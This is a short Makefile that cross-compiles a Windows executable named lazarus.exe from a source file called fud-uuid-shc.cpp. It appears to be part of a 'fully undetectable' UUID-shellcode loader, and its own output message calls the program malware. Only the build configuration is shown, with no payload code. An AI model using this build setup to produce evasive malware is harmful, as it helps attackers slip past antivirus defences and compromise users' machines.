# compilation information
CC = x86_64-w64-mingw32-g++
FLAGS = -I/usr/share/mingw-w64/include/ -L/usr/x86_64-w64-mingw32/lib/ \
		-s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions \
		-fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
OPT_FLAGS = -Ofast -flto
LIBS = -lrpcrt4

# Necessary File information
SRC_FILE = fud-uuid-shc.cpp
BIN_NAME = lazarus.exe

all:
	@printf "[+] Compiling the malware using ${CC}...\n\n"
	@${CC} ${FLAGS} ${OPT_FLAGS} ${SRC_FILE} -o ${BIN_NAME} ${LIBS}
	@printf "[+] Compiling done! \n\n\tBest of luck from: @Bl4ckMirror & @winterrdog :)"